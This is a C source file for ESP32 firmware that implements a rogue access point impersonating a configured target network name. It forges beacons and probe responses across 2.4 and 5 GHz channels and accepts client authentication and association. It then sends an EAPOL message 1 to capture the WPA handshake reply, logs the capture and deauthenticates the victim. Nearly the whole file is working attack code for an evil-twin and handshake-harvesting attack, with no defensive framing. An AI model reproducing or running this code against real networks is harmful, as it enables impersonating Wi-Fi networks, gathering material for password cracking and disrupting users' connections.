#include <string.h>
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_mac.h"
#include "esp_system.h"
#include "esp_random.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/queue.h"
#include "config.h"

#define TAG "Fake_AP"

#define FAKE_BSSID {0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x01}
#define CHANNEL_SWITCH_MS 150
#define MAX_CLIENTS 4
#define CLIENT_TIMEOUT_MS 10000

static const uint8_t channels[] = {
    1,2,3,4,5,6,7,8,9,10,11,12,13,14,
    36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140,144,149,153,157,161,165
};
#define CHAN_COUNT (sizeof(channels) / sizeof(channels[0]))

#define FC_PROBE_REQ    0x40
#define FC_PROBE_RESP   0x50
#define FC_AUTH         0xB0
#define FC_ASSOC_REQ    0x00
#define FC_ASSOC_RESP   0x10
#define FC_BEACON       0x80
#define FC_DEAUTH       0xC0
#define FC_FROMDS       0x02

typedef enum {
    CLIENT_IDLE,
    CLIENT_AUTHED,
    CLIENT_ASSOCED,
    CLIENT_EAPOL_M1_SENT,
    CLIENT_CAPTURED,
} client_state_t;

typedef struct {
    uint8_t mac[6];
    client_state_t state;
    uint16_t aid;
    uint8_t anonce[32];
    TickType_t last_seen;
} client_entry_t;

typedef struct {
    uint8_t src[6];
    uint8_t subtype;
} queued_frame_t;

static client_entry_t clients[MAX_CLIENTS];
static int chan_idx = 0;
static uint8_t fake_bssid[6] = FAKE_BSSID;
static QueueHandle_t frame_queue = NULL;
static TaskHandle_t fake_ap_task_handle = NULL;

static const uint8_t mgmt_hdr_template[24] = {
    0x00, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
};

static const uint8_t auth_body[6] = {
    0x00, 0x00,
    0x02, 0x00,
    0x00, 0x00,
};

static const uint8_t tagged_rates[10] = {
    0x01, 0x08,
    0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C,
};

static const uint8_t tagged_rsn[26] = {
    0x30, 0x18,
    0x01, 0x00,
    0x00, 0x0F, 0xAC, 0x02,
    0x02, 0x00,
    0x00, 0x0F, 0xAC, 0x04, 0x00, 0x0F, 0xAC, 0x04,
    0x01, 0x00,
    0x00, 0x0F, 0xAC, 0x02,
    0x00, 0x00,
};

static client_entry_t *find_client(const uint8_t *mac) {
    for (int i = 0; i < MAX_CLIENTS; i++)
        if (memcmp(clients[i].mac, mac, 6) == 0)
            return &clients[i];
    return NULL;
}

static client_entry_t *alloc_client(const uint8_t *mac) {
    for (int i = 0; i < MAX_CLIENTS; i++) {
        if (clients[i].state == CLIENT_IDLE) {
            memcpy(clients[i].mac, mac, 6);
            clients[i].state = CLIENT_AUTHED;
            clients[i].aid = 0;
            clients[i].last_seen = xTaskGetTickCount();
            return &clients[i];
        }
    }
    ESP_LOGW(TAG, "Client table full");
    return NULL;
}

static void free_client(client_entry_t *c) {
    c->state = CLIENT_IDLE;
    memset(c->mac, 0, 6);
}

static void expire_clients(void) {
    TickType_t now = xTaskGetTickCount();
    for (int i = 0; i < MAX_CLIENTS; i++) {
        if (clients[i].state != CLIENT_IDLE &&
            (now - clients[i].last_seen) > pdMS_TO_TICKS(CLIENT_TIMEOUT_MS)) {
            ESP_LOGI(TAG, "Client " MACSTR " timed out", MAC2STR(clients[i].mac));
            free_client(&clients[i]);
        }
    }
}

static size_t append_ssid_tagged(uint8_t *buf, size_t max) {
    size_t len = strlen(TARGET_SSID);
    if (len > SSID_MAX_LEN) len = SSID_MAX_LEN;
    if (len + 2 > max) len = max - 2;
    buf[0] = 0x00;
    buf[1] = len;
    memcpy(buf + 2, TARGET_SSID, len);
    return len + 2;
}

static size_t append_rates_tagged(uint8_t *buf, size_t max) {
    if (sizeof(tagged_rates) > max) return 0;
    memcpy(buf, tagged_rates, sizeof(tagged_rates));
    return sizeof(tagged_rates);
}

static size_t append_channel_tagged(uint8_t *buf, size_t max) {
    if (3 > max) return 0;
    buf[0] = 0x03;
    buf[1] = 0x01;
    buf[2] = channels[chan_idx];
    return 3;
}

static size_t append_rsn_tagged(uint8_t *buf, size_t max) {
    if (sizeof(tagged_rsn) > max) return 0;
    memcpy(buf, tagged_rsn, sizeof(tagged_rsn));
    return sizeof(tagged_rsn);
}

static size_t build_probe_resp(uint8_t *buf, size_t cap, const uint8_t *client_mac) {
    size_t off = 0;
    if (cap < 24) return 0;

    memcpy(buf + off, mgmt_hdr_template, 24); off = 24;
    buf[0] = 0x50;

    memcpy(buf + 4, client_mac, 6);
    memcpy(buf + 10, fake_bssid, 6);
    memcpy(buf + 16, fake_bssid, 6);

    uint64_t ts = xTaskGetTickCount() * 1000ULL;
    memcpy(buf + off, &ts, 8); off += 8;
    buf[off++] = 0xE8; buf[off++] = 0x03;
    buf[off++] = 0x21; buf[off++] = 0x00;

    off += append_ssid_tagged(buf + off, cap - off);
    off += append_rates_tagged(buf + off, cap - off);
    off += append_channel_tagged(buf + off, cap - off);
    off += append_rsn_tagged(buf + off, cap - off);

    return off;
}

static size_t build_auth_resp(uint8_t *buf, const uint8_t *client_mac) {
    size_t off = 0;
    memcpy(buf + off, mgmt_hdr_template, 24); off = 24;
    buf[0] = FC_AUTH;

    memcpy(buf + 4, client_mac, 6);
    memcpy(buf + 10, fake_bssid, 6);
    memcpy(buf + 16, fake_bssid, 6);

    memcpy(buf + off, auth_body, 6); off += 6;
    return off;
}

static size_t build_assoc_resp(uint8_t *buf, const uint8_t *client_mac) {
    size_t off = 0;
    memcpy(buf + off, mgmt_hdr_template, 24); off = 24;
    buf[0] = FC_ASSOC_RESP;

    memcpy(buf + 4, client_mac, 6);
    memcpy(buf + 10, fake_bssid, 6);
    memcpy(buf + 16, fake_bssid, 6);

    buf[off++] = 0x21; buf[off++] = 0x00;
    buf[off++] = 0x00; buf[off++] = 0x00;
    buf[off++] = 0x01; buf[off++] = 0xC0;
    return off;
}

static size_t build_eapol_m1(uint8_t *buf, size_t cap, const uint8_t *client_mac, const uint8_t *anonce) {
    size_t off = 0;
    if (cap < 200) return 0;

    buf[off++] = 0x08;
    buf[off++] = FC_FROMDS;
    buf[off++] = 0x00; buf[off++] = 0x00;
    memcpy(buf + off, client_mac, 6); off += 6;
    memcpy(buf + off, fake_bssid, 6); off += 6;
    memcpy(buf + off, fake_bssid, 6); off += 6;
    buf[off++] = 0x00; buf[off++] = 0x00;

    buf[off++] = 0xAA; buf[off++] = 0xAA; buf[off++] = 0x03;
    buf[off++] = 0x00; buf[off++] = 0x00; buf[off++] = 0x00;
    buf[off++] = 0x88; buf[off++] = 0x8E;

    size_t key_data_len = sizeof(tagged_rsn);
    size_t eapol_key_len = 95 + key_data_len;

    buf[off++] = 0x03; buf[off++] = 0x03;
    buf[off++] = (eapol_key_len >> 8) & 0xFF;
    buf[off++] = eapol_key_len & 0xFF;

    buf[off++] = 0x02;
    buf[off++] = 0x2A; buf[off++] = 0x00;
    buf[off++] = 0x00; buf[off++] = 0x10;
    memset(buf + off, 0, 8); off += 8;
    memcpy(buf + off, anonce, 32); off += 32;
    memset(buf + off, 0, 16); off += 16;
    memset(buf + off, 0, 8);  off += 8;
    memset(buf + off, 0, 8);  off += 8;
    memset(buf + off, 0, 16); off += 16;
    buf[off++] = (key_data_len >> 8) & 0xFF;
    buf[off++] = key_data_len & 0xFF;
    memcpy(buf + off, tagged_rsn, key_data_len); off += key_data_len;

    return off;
}

static size_t build_deauth(uint8_t *buf, const uint8_t *client_mac) {
    size_t off = 0;
    memcpy(buf + off, mgmt_hdr_template, 24); off = 24;
    buf[0] = FC_DEAUTH;
    memcpy(buf + 4, client_mac, 6);
    memcpy(buf + 10, fake_bssid, 6);
    memcpy(buf + 16, fake_bssid, 6);
    buf[off++] = 0x07; buf[off++] = 0x00;
    return off;
}

static size_t build_beacon(uint8_t *buf, size_t cap) {
    size_t off = 0;
    if (cap < 24) return 0;

    memcpy(buf + off, mgmt_hdr_template, 24); off = 24;
    buf[0] = 0x80;
    memcpy(buf + 10, fake_bssid, 6);
    memcpy(buf + 16, fake_bssid, 6);

    uint64_t ts = xTaskGetTickCount() * 1000ULL;
    memcpy(buf + off, &ts, 8); off += 8;
    buf[off++] = 0xE8; buf[off++] = 0x03;
    buf[off++] = 0x21; buf[off++] = 0x00;

    off += append_ssid_tagged(buf + off, cap - off);
    off += append_rates_tagged(buf + off, cap - off);
    off += append_channel_tagged(buf + off, cap - off);
    off += append_rsn_tagged(buf + off, cap - off);

    return off;
}

static void tx_frame(const uint8_t *buf, size_t len) {
    esp_wifi_80211_tx(WIFI_IF_STA, buf, len, 0);
}

static void send_beacon(void) {
    uint8_t buf[128];
    size_t len = build_beacon(buf, sizeof(buf));
    if (len > 0) tx_frame(buf, len);
}

static void send_probe_resp(const uint8_t *client_mac) {
    uint8_t buf[128];
    size_t len = build_probe_resp(buf, sizeof(buf), client_mac);
    if (len > 0) tx_frame(buf, len);
}

static void send_auth_resp(const uint8_t *client_mac) {
    uint8_t buf[64];
    size_t len = build_auth_resp(buf, client_mac);
    tx_frame(buf, len);
}

static void send_assoc_resp(const uint8_t *client_mac) {
    uint8_t buf[64];
    size_t len = build_assoc_resp(buf, client_mac);
    tx_frame(buf, len);
}

static void send_eapol_m1(client_entry_t *c) {
    uint8_t buf[256];
    esp_fill_random(c->anonce, 32);
    size_t len = build_eapol_m1(buf, sizeof(buf), c->mac, c->anonce);
    if (len > 0) tx_frame(buf, len);
    c->state = CLIENT_EAPOL_M1_SENT;
    c->last_seen = xTaskGetTickCount();
}

static void send_deauth(const uint8_t *client_mac) {
    uint8_t buf[32];
    size_t len = build_deauth(buf, client_mac);
    tx_frame(buf, len);
}

static void promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;

    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA)
        return;

    uint16_t len = pkt->rx_ctrl.sig_len;
    if (len < 24) return;

    uint8_t *f = pkt->payload;
    uint8_t fc = f[0];

    if (type == WIFI_PKT_MGMT) {
        uint8_t subtype = fc & 0xF0;
        if (subtype != FC_PROBE_REQ && subtype != FC_AUTH && subtype != FC_ASSOC_REQ)
            return;
    } else if (type == WIFI_PKT_DATA) {
        if ((f[1] & 0x03) != 0x01) return;
        if (len < 34) return;
        if (f[24] != 0xAA || f[25] != 0xAA || f[26] != 0x03) return;
        if (f[30] != 0x88 || f[31] != 0x8E) return;
    } else {
        return;
    }

    queued_frame_t qf;
    memcpy(qf.src, f + 10, 6);
    qf.subtype = fc & 0xF0;

    if (frame_queue) {
        xQueueSend(frame_queue, &qf, 0);
    }
}

static void handle_frame(const queued_frame_t *qf) {
    switch (qf->subtype) {
    case FC_PROBE_REQ:
        send_probe_resp(qf->src);
        break;

    case FC_AUTH: {
        client_entry_t *c = find_client(qf->src);
        if (!c) c = alloc_client(qf->src);
        if (c) {
            send_auth_resp(qf->src);
            c->last_seen = xTaskGetTickCount();
        }
        break;
    }

    case FC_ASSOC_REQ: {
        client_entry_t *c = find_client(qf->src);
        if (c && c->state >= CLIENT_AUTHED) {
            send_assoc_resp(qf->src);
            c->state = CLIENT_ASSOCED;
            c->last_seen = xTaskGetTickCount();
            send_eapol_m1(c);
            ESP_LOGI(TAG, "Client " MACSTR " associated, sent EAPOL M1", MAC2STR(qf->src));
        }
        break;
    }

    default: {
        client_entry_t *c = find_client(qf->src);
        if (c && c->state >= CLIENT_ASSOCED) {
            ESP_LOGI(TAG, "Captured EAPOL from " MACSTR, MAC2STR(qf->src));
            ESP_LOGI(TAG, "Client attempted connection with password -> wrong password shown");
            c->state = CLIENT_CAPTURED;
            c->last_seen = xTaskGetTickCount();
            send_deauth(qf->src);
        }
        break;
    }
    }
}

static void fake_ap_task(void *arg) {
    ESP_LOGI(TAG, "Fake AP started on STA interface (no hardware AP)");

    frame_queue = xQueueCreate(32, sizeof(queued_frame_t));
    if (!frame_queue) {
        ESP_LOGE(TAG, "Failed to create queue");
        vTaskDelete(NULL);
        return;
    }

    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_rx_cb(&promisc_cb));
    ESP_LOGI(TAG, "Promiscuous mode enabled, waiting for clients...");

    while (1) {
        expire_clients();

        send_beacon();

        queued_frame_t qf;
        while (xQueueReceive(frame_queue, &qf, 0) == pdTRUE)
            handle_frame(&qf);

        chan_idx = (chan_idx + 1) % CHAN_COUNT;
        esp_wifi_set_channel(channels[chan_idx], WIFI_SECOND_CHAN_NONE);

        fake_bssid[4] = channels[chan_idx];

        vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_MS));
    }
}

void start_fake_ap(void) {
    if (fake_ap_task_handle != NULL) {
        ESP_LOGW(TAG, "Fake AP task already running");
        return;
    }
    xTaskCreate(&fake_ap_task, "fake_ap_task", 4096, NULL, 3, &fake_ap_task_handle);
}

void stop_fake_ap(void) {
    if (fake_ap_task_handle != NULL) {
        vTaskDelete(fake_ap_task_handle);
        fake_ap_task_handle = NULL;
    }
    if (frame_queue != NULL) {
        vQueueDelete(frame_queue);
        frame_queue = NULL;
    }
    ESP_LOGI(TAG, "Fake AP stopped");
}
